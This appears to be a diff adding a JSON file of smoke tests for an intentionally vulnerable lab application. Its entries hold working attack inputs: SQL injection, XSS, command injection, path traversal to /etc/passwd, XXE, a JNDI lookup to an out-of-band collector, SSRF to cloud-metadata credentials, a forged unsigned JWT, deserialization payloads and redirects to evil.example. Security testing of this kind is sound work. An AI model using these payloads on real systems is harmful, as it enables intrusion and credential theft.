@@ -1,0 +1,470 @@
+{
+  "API-001": {
+    "login": {"url": "/api/v1/login", "json": {"username": "alice", "password": "password1"}, "token_path": "token"},
+    "steps": [{"method": "GET", "path": "/api/v1/orders/3", "use_token": "default"}],
+    "check": {"body_contains": ["\"owner\":\"admin\""]}
+  },
+  "API-002": {
+    "login": {"url": "/api/v1/login", "json": {"username": "alice", "password": "password1"}, "token_path": "token"},
+    "steps": [{"method": "GET", "path": "/api/v1/users/1", "use_token": "default"}],
+    "check": {"body_contains": ["\"ssn\":\"111-11-1111\""]}
+  },
+  "API-003": {
+    "login": {"url": "/api/v1/login", "json": {"username": "alice", "password": "password1"}, "token_path": "token"},
+    "steps": [{"method": "DELETE", "path": "/api/v1/users/1", "use_token": "default"}],
+    "check": {"body_contains": ["\"deleted\":\"admin\""]}
+  },
+  "API-004": {
+    "login": {"url": "/api/v1/login", "json": {"username": "alice", "password": "password1"}, "token_path": "token"},
+    "steps": [{"method": "PUT", "path": "/api/v1/users/2", "json": {"role": "admin"}, "use_token": "default"}],
+    "check": {"body_contains": ["\"role\":\"admin\""]}
+  },
+  "API-005": {
+    "steps": [{"method": "POST", "json": {"username": {"$ne": "nobody"}, "password": {"$ne": "nobody"}}}],
+    "check": {"body_contains": ["\"authenticated\":true"]}
+  },
+  "API-006": {
+    "steps": [{
+      "method": "GET",
+      "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."}
+    }],
+    "check": {"body_contains": ["\"isAdmin\":true"]}
+  },
+  "API-007": {
+    "steps": [{"method": "GET", "params": {"username": "admin"}}],
+    "check": {"body_contains": ["\"role\":\"admin\"", "\"token\""]}
+  },
+  "API-008": {
+    "steps": [{"method": "POST", "json": {"__proto__": {"polluted": "yes"}}}],
+    "check": {"body_contains": ["\"polluted\":\"yes\""]}
+  },
+  "API-009": {
+    "steps": [{"method": "POST", "json": {"url": "http://internal-metadata/latest/meta-data/iam/security-credentials/vulnforge-role"}}],
+    "check": {"body_contains": ["AccessKeyId"]}
+  },
+  "API-010": {
+    "steps": [{"method": "GET", "params": {"limit": "5000"}}],
+    "check": {"body_contains": ["\"count\":5000"]}
+  },
+  "API-011": {
+    "steps": [{"method": "GET", "params": {"api_key": "ak_admin_2f8c1d9e"}}],
+    "check": {"body_contains": ["\"exported\""]}
+  },
+  "API-012": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["JWT_WEAK_SECRET"]}
+  },
+  "API-013": {
+    "steps": [{"method": "GET", "headers": {"Origin": "https://evil.example"}}],
+    "check": {"header_contains": {"access-control-allow-origin": "https://evil.example"}}
+  },
+  "API-014": {
+    "steps": [
+      {"method": "POST", "json": {"username": "alice", "password": "bad"}},
+      {"method": "POST", "json": {"username": "alice", "password": "bad"}},
+      {"method": "POST", "json": {"username": "alice", "password": "bad"}},
+      {"method": "POST", "json": {"username": "alice", "password": "bad"}},
+      {"method": "POST", "json": {"username": "alice", "password": "bad"}},
+      {"method": "POST", "json": {"username": "alice", "password": "password1"}}
+    ],
+    "check": {"body_contains": ["\"authenticated\":true"]},
+    "control_check": {"status": 429}
+  },
+
+  "PY-001": {
+    "steps": [{"method": "GET", "params": {"name": "{{7*7}}"}}],
+    "check": {"body_contains": ["Hello 49!"]}
+  },
+  "PY-002": {
+    "steps": [{"method": "POST", "data": {"data": "gAWVEQAAAAAAAACMDVBJQ0tMRV9NQVJLRVKULg=="}}],
+    "check": {"body_contains": ["PICKLE_MARKER"]}
+  },
+  "PY-003": {
+    "steps": [{"method": "POST", "data": {"config": "!!python/object/apply:builtins.dict [[['marker', 'YAML_MARKER']]]"}}],
+    "check": {"body_contains": ["YAML_MARKER"]}
+  },
+  "PY-004": {
+    "steps": [{"method": "GET", "params": {"file": "../../etc/passwd"}}],
+    "check": {"body_contains": ["root:"]}
+  },
+  "PY-005": {
+    "steps": [{"method": "GET", "params": {"url": "http://internal-metadata/latest/meta-data/iam/security-credentials/vulnforge-role"}}],
+    "check": {"body_contains": ["AccessKeyId"]}
+  },
+  "PY-006": {
+    "steps": [{"method": "GET", "params": {"host": "127.0.0.1; echo PY_MARKER"}}],
+    "check": {"body_contains": ["PY_MARKER"]}
+  },
+  "PY-007": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["Interactive Console"]}
+  },
+  "PY-008": {
+    "steps": [{"method": "GET", "params": {"next": "https://evil.example/"}}],
+    "check": {"header_contains": {"location": "https://evil.example/"}},
+    "allow_redirects": false
+  },
+  "PY-009": {
+    "steps": [{"method": "GET", "params": {"user": "alice"}}],
+    "check": {"body_contains": ["b5acb9c6b3dc2bcc"]}
+  },
+  "PY-010": {
+    "steps": [{"method": "GET", "params": {"user": "alice"}}],
+    "check": {"header_contains": {"set-cookie": "user=alice"}}
+  },
+  "PY-011": {
+    "steps": [{"method": "GET", "params": {"email": "aaaaaaaaaaaaaaaaaaaaaaaaaa!"}}],
+    "check": {"min_time": 1.5}
+  },
+
+  "JAVA-001": {
+    "steps": [{"method": "POST", "data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><name>&xxe;</name></root>"}],
+    "check": {"body_contains": ["root:"]}
+  },
+  "JAVA-002": {
+    "steps": [{"method": "POST", "data": "<java><object class=\"SpringSvc$Gadget\"><void property=\"command\"><string>id</string></void></object></java>"}],
+    "check": {"body_contains": ["\"pwned\":\"yes\""]}
+  },
+  "JAVA-003": {
+    "steps": [{"method": "GET", "params": {"name": "${file:/etc/passwd}"}}],
+    "check": {"body_contains": ["root:"]}
+  },
+  "JAVA-004": {
+    "steps": [{"method": "GET", "params": {"msg": "${jndi:ldap://oob-collector:9000/oob/JAVA004}"}}],
+    "check": {"body_contains": ["\"lookup_performed\":true"]}
+  },
+  "JAVA-005": {
+    "steps": [{"method": "GET", "params": {"file": "../../../etc/passwd"}}],
+    "check": {"body_contains": ["root:"]}
+  },
+  "JAVA-006": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["propertySources"]}
+  },
+  "JAVA-007": {
+    "steps": [{"method": "POST", "data": "AAAAAAAA"}],
+    "check": {"body_contains": ["DES/ECB"]}
+  },
+  "JAVA-008": {
+    "steps": [{"method": "GET", "params": {"cmd": "127.0.0.1; echo JAVA_MARKER"}}],
+    "check": {"body_contains": ["JAVA_MARKER"]}
+  },
+  "JAVA-009": {
+    "steps": [{"method": "GET", "params": {"url": "https://evil.example/"}}],
+    "check": {"header_contains": {"location": "https://evil.example/"}},
+    "allow_redirects": false
+  },
+  "JAVA-010": {
+    "steps": [{"method": "GET", "params": {"input": "boom"}}],
+    "check": {"body_contains": ["IllegalStateException"]}
+  },
+
+  "GO-001": {
+    "steps": [{"method": "GET", "params": {"url": "http://internal-metadata/latest/meta-data/iam/security-credentials/vulnforge-role"}}],
+    "check": {"body_contains": ["AccessKeyId"]}
+  },
+  "GO-002": {
+    "steps": [{"method": "GET", "params": {"url": "http://oob-collector:9000/oob/GO002"}}],
+    "check": {"body_contains": ["\"queued\":true"]}
+  },
+  "GO-003": {
+    "steps": [
+      {"method": "POST", "json": {"code": "WELCOME10"}, "parallel": 5},
+      {"method": "GET", "path": "/go/coupon/status"}
+    ],
+    "check": {"body_regex": "\"redemptions\":\\s*[2-9]"}
+  },
+  "GO-005": {
+    "steps": [{"method": "GET", "params": {"file": "../../../../etc/passwd"}}],
+    "check": {"body_contains": ["root:"]}
+  },
+  "GO-006": {
+    "steps": [{"method": "GET", "params": {"cmd": "127.0.0.1; echo GO_MARKER"}}],
+    "check": {"body_contains": ["GO_MARKER"]}
+  },
+  "GO-007": {
+    "steps": [{"method": "GET", "params": {"next": "https://evil.example/"}}],
+    "check": {"header_contains": {"location": "https://evil.example/"}},
+    "allow_redirects": false
+  },
+  "GO-008": {
+    "steps": [
+      {"method": "POST", "json": {"code": "0000"}},
+      {"method": "POST", "json": {"code": "0001"}},
+      {"method": "POST", "json": {"code": "0002"}},
+      {"method": "POST", "json": {"code": "0003"}},
+      {"method": "POST", "json": {"code": "0004"}},
+      {"method": "POST", "json": {"code": "4821"}}
+    ],
+    "check": {"body_contains": ["\"verified\":true"]},
+    "control_check": {"status": 429}
+  },
+  "GO-009": {
+    "steps": [{"method": "POST", "json": {"amount": -500}}],
+    "check": {"body_contains": ["\"balance\":10500"]}
+  },
+  "GO-010": {
+    "steps": [{"method": "GET", "params": {"input": "boom"}}],
+    "check": {"body_contains": ["goroutine"]}
+  },
+  "GO-011": {
+    "steps": [{"method": "GET"}],
+    "check": {"header_contains": {"access-control-allow-origin": "*"}}
+  },
+
+  "GQL-001": {
+    "steps": [{"method": "POST", "json": {"query": "{__schema{types{name}}}"}}],
+    "check": {"body_contains": ["\"name\":\"User\""]}
+  },
+  "GQL-002": {
+    "steps": [{"method": "POST", "json": {"query": "{ userr { id } }"}}],
+    "check": {"body_contains": ["Did you mean"]}
+  },
+  "GQL-003": {
+    "steps": [{"method": "POST", "json": [
+      {"query": "{ hello }"}, {"query": "{ hello }"}, {"query": "{ hello }"}, {"query": "{ hello }"},
+      {"query": "{ hello }"}, {"query": "{ hello }"}, {"query": "{ hello }"}, {"query": "{ hello }"},
+      {"query": "{ hello }"}, {"query": "{ hello }"}
+    ]}],
+    "check": {"header_contains": {"x-batch-size": "10"}}
+  },
+  "GQL-004": {
+    "steps": [{"method": "POST", "json": {"query": "{ a1: verifyOtp(userId: 1, code: \"0000\") a2: verifyOtp(userId: 1, code: \"0001\") a3: verifyOtp(userId: 1, code: \"0002\") a4: verifyOtp(userId: 1, code: \"0003\") a5: verifyOtp(userId: 1, code: \"0004\") a6: verifyOtp(userId: 1, code: \"0005\") a7: verifyOtp(userId: 1, code: \"4821\") }"}}],
+    "check": {"body_contains": ["\"a7\":true"]}
+  },
+  "GQL-005": {
+    "steps": [{"method": "POST", "json": {"query": "{ h0: hello h1: hello h2: hello h3: hello h4: hello h5: hello h6: hello h7: hello h8: hello h9: hello h10: hello h11: hello h12: hello h13: hello h14: hello h15: hello h16: hello h17: hello h18: hello h19: hello h20: hello h21: hello h22: hello h23: hello h24: hello h25: hello h26: hello h27: hello h28: hello h29: hello h30: hello h31: hello h32: hello h33: hello h34: hello h35: hello h36: hello h37: hello h38: hello h39: hello h40: hello h41: hello h42: hello h43: hello h44: hello h45: hello h46: hello h47: hello h48: hello h49: hello h50: hello h51: hello h52: hello h53: hello h54: hello h55: hello h56: hello h57: hello h58: hello h59: hello h60: hello h61: hello h62: hello h63: hello h64: hello h65: hello h66: hello h67: hello h68: hello h69: hello h70: hello h71: hello h72: hello h73: hello h74: hello h75: hello h76: hello h77: hello h78: hello h79: hello h80: hello h81: hello h82: hello h83: hello h84: hello h85: hello h86: hello h87: hello h88: hello h89: hello h90: hello h91: hello h92: hello h93: hello h94: hello h95: hello h96: hello h97: hello h98: hello h99: hello h100: hello h101: hello h102: hello h103: hello h104: hello h105: hello h106: hello h107: hello h108: hello h109: hello h110: hello h111: hello h112: hello h113: hello h114: hello h115: hello h116: hello h117: hello h118: hello h119: hello }"}}],
+    "check": {"body_contains": ["\"h119\""]}
+  },
+  "GQL-006": {
+    "steps": [{"method": "POST", "headers": {"x-user-id": "2"}, "json": {"query": "{ user(id: 1) { username ssn } }"}}],
+    "check": {"body_contains": ["111-11-1111"]}
+  },
+
+  "CRAWL-001": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["/spa/panel"]}
+  },
+  "CRAWL-002": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["sourcesContent"]}
+  },
+  "CRAWL-003": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["INTERNAL_API_KEY"]}
+  },
+  "CRAWL-004": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["Page not found"]},
+    "control_check": {"status": 404}
+  },
+  "CRAWL-005": {
+    "steps": [{"method": "GET", "params": {"page": "500"}}],
+    "check": {"body_contains": ["page=501"]}
+  },
+  "CRAWL-006": {
+    "steps": [{"method": "GET", "headers": {"Origin": "https://evil.example"}}],
+    "check": {"body_contains": ["\"upgrade_allowed\":true"]}
+  },
+  "CRAWL-007": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["session_token"]}
+  },
+  "CRAWL-008": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["Internal support panel"]}
+  },
+
+  "LEG-001": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["jquery-1.8.3"]}
+  },
+  "LEG-002": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["DB_PASSWORD"]}
+  },
+  "LEG-003": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["[core]"]}
+  },
+  "LEG-004": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["Index of /backup"]}
+  },
+  "LEG-005": {
+    "steps": [{"method": "POST", "data": {"username": "admin", "password": "admin"}}],
+    "check": {"body_contains": ["\"authenticated\": true"]}
+  },
+  "LEG-006": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["Apache/2.2.15"]}
+  },
+  "LEG-007": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["WordPress"]}
+  },
+
+  "OAUTH-001": {
+    "steps": [{"method": "GET", "params": {"client_id": "shop", "response_type": "code", "redirect_uri": "https://evil.example/cb", "state": "x"}}],
+    "check": {"header_contains": {"location": "https://evil.example/cb"}},
+    "allow_redirects": false
+  },
+  "OAUTH-002": {
+    "steps": [{"method": "GET", "params": {"client_id": "shop", "response_type": "code", "redirect_uri": "http://127.0.0.1:8000/auth/callback"}}],
+    "check": {"header_contains": {"location": "code="}},
+    "allow_redirects": false
+  },
+  "OAUTH-003": {
+    "steps": [{"method": "GET", "params": {"client_id": "shop", "redirect_uri": "https://evil.example/cb"}}],
+    "check": {"header_contains": {"location": "access_token="}},
+    "allow_redirects": false
+  },
+  "OAUTH-004": {
+    "steps": [{"method": "POST", "data": {"code": "abc123", "grant_type": "authorization_code"}}],
+    "check": {"body_contains": ["access_token"]}
+  },
+  "OAUTH-005": {
+    "steps": [{"method": "GET", "params": {"scope": "read admin"}}],
+    "check": {"body_contains": ["\"role\": \"admin\""]}
+  },
+  "OAUTH-006": {
+    "steps": [{"method": "POST", "data": {"SAMLResponse": "PHNhbWw6QXNzZXJ0aW9uPjxTdWJqZWN0PmFkbWluPC9TdWJqZWN0Pjwvc2FtbDpBc3NlcnRpb24+"}}],
+    "check": {"body_contains": ["\"authenticated\": true"]}
+  },
+  "OAUTH-007": {
+    "steps": [{"method": "POST", "data": {"username": "ghost", "password": "x"}}],
+    "check": {"body_contains": ["unknown user"]}
+  },
+
+  "SQLI-001": {
+    "steps": [{"method": "GET", "params": {"id": "0 UNION SELECT 1,'SQLI_MARKER',3,4,5,6"}}],
+    "check": {"body_contains": ["SQLI_MARKER"]}
+  },
+  "SQLI-002": {
+    "steps": [{"method": "GET", "params": {"q": "x%' UNION SELECT 1,'SQLI_MARKER',3,4,5,6-- -"}}],
+    "check": {"body_contains": ["SQLI_MARKER"]}
+  },
+  "SQLI-003": {
+    "steps": [{"method": "GET", "params": {"id": "1 AND 1=2"}}],
+    "check": {"body_contains": ["\"product\":null"]}
+  },
+  "SQLI-004": {
+    "steps": [{"method": "GET", "params": {"id": "1 AND SLEEP(4)"}}],
+    "check": {"min_time": 3.0}
+  },
+  "SQLI-005": {
+    "steps": [{"method": "GET", "params": {"sort": "1,(SELECT SLEEP(4))"}}],
+    "check": {"min_time": 3.0}
+  },
+  "SQLI-006": {
+    "steps": [
+      {"method": "POST", "params": {"action": "register"}, "data": {"username": "admin'--", "password": "x"}},
+      {"method": "POST", "params": {"action": "change_password"}, "data": {"username": "admin'--", "new_password": "owned"}}
+    ],
+    "check": {"body_contains": ["executed_query", "admin'--"]}
+  },
+  "SQLI-007": {
+    "steps": [{"method": "GET", "headers": {"X-Forwarded-For": "127.0.0.1' AND extractvalue(1,concat(0x7e,'SQLI_MARKER'))-- -"}}],
+    "check": {"body_contains": ["SQLI_MARKER"]}
+  },
+  "XSS-001": {
+    "steps": [{"method": "GET", "params": {"name": "<script>alert('XSS_MARKER')</script>"}}],
+    "check": {"body_contains": ["<script>alert('XSS_MARKER')</script>"]}
+  },
+  "XSS-002": {
+    "steps": [
+      {"method": "POST", "data": {"body": "<script>alert('XSS_MARKER')</script>"}},
+      {"method": "GET"}
+    ],
+    "check": {"body_contains": ["<script>alert('XSS_MARKER')</script>"]}
+  },
+  "XSS-003": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["innerHTML"]}
+  },
+  "CMDI-001": {
+    "steps": [{"method": "GET", "params": {"host": "127.0.0.1; echo CMDI_MARKER"}}],
+    "check": {"body_contains": ["CMDI_MARKER"]}
+  },
+  "CMDI-002": {
+    "steps": [{"method": "GET", "params": {"host": "127.0.0.1; sleep 4"}}],
+    "check": {"min_time": 3.0}
+  },
+  "LFI-001": {
+    "steps": [{"method": "GET", "params": {"file": "../../../../../etc/passwd"}}],
+    "check": {"body_contains": ["root:"]}
+  },
+  "UPLOAD-001": {
+    "steps": [
+      {"method": "POST", "files": {"file": {"filename": "smoke_upload.php", "content": "<?php echo 'UPLOAD_MARKER'; ?>", "content_type": "application/x-php"}}},
+      {"method": "GET", "path": "/php/uploads/smoke_upload.php", "check": {"body_contains": ["UPLOAD_MARKER"]}}
+    ],
+    "check": {"body_contains": ["UPLOAD_MARKER"]},
+    "control_check": {"status": 400}
+  },
+  "CSRF-001": {
+    "login": {"username": "eve", "password": "monkey"},
+    "steps": [{"method": "POST", "data": {"new_password": "smoke-pass-123"}}],
+    "check": {"body_contains": ["\"updated\":true"]},
+    "control_check": {"status": 403}
+  },
+  "REDIR-001": {
+    "steps": [{"method": "GET", "params": {"next": "https://evil.example/"}}],
+    "check": {"header_contains": {"location": "https://evil.example/"}},
+    "allow_redirects": false
+  },
+  "IDOR-001": {
+    "login": {"username": "alice", "password": "password1"},
+    "steps": [{"method": "GET", "params": {"id": "5"}}],
+    "check": {"body_contains": ["\"username\":\"admin\""]}
+  },
+  "IDOR-002": {
+    "login": {"username": "alice", "password": "password1"},
+    "steps": [{"method": "GET", "params": {"user_id": "1"}}],
+    "check": {"body_contains": ["\"role\":\"admin\""]}
+  },
+  "AUTH-001": {
+    "steps": [{"method": "POST", "data": {"username": "admin'-- -", "password": "x"}}],
+    "check": {"body_contains": ["\"authenticated\":true"]}
+  },
+  "AUTH-002": {
+    "steps": [
+      {"method": "POST", "data": {"username": "alice", "password": "password1"},
+       "headers": {"Cookie": "PHPSESSID=fixatedsmoke1234567890"},
+       "check": {"body_contains": ["\"authenticated\":true"]}},
+      {"method": "GET", "path": "/php/idor/profile.php", "params": {"user_id": "2"},
+       "headers": {"Cookie": "PHPSESSID=fixatedsmoke1234567890"}}
+    ],
+    "check": {"body_contains": ["\"username\":\"alice\""]}
+  },
+  "AUTH-003": {
+    "steps": [{"method": "POST", "data": {"username": "alice", "password": "definitely-wrong"}}],
+    "check": {"body_contains": ["\"error\":\"wrong password\""]}
+  },
+  "AUTH-004": {
+    "steps": [
+      {"method": "POST", "path": "/php/auth/login.php", "data": {"username": "alice", "password": "password1"},
+       "capture_cookie": "sid", "check": {"body_contains": ["\"authenticated\":true"]}},
+      {"method": "GET", "path": "/php/auth/logout.php"},
+      {"method": "GET", "path": "/php/idor/profile.php", "params": {"user_id": "2"}, "use_cookie": "sid"}
+    ],
+    "check": {"body_contains": ["\"username\":\"alice\""]}
+  },
+  "CONF-001": {
+    "steps": [{"method": "GET", "params": {"input": "boom"}}],
+    "check": {"body_contains": ["RuntimeException"]}
+  },
+  "CONF-002": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["PHP Version"]},
+    "control_check": {"status": 404}
+  },
+  "CRYPTO-001": {
+    "steps": [{"method": "POST", "data": {"password": "letmein"}}],
+    "check": {"body_contains": ["0d107d09f5bbe40cade3de5c71e9e9b7"]}
+  },
+  "INFO-001": {
+    "steps": [{"method": "GET"}],
+    "check": {"body_contains": ["/php/config/"]}
+  }
+}
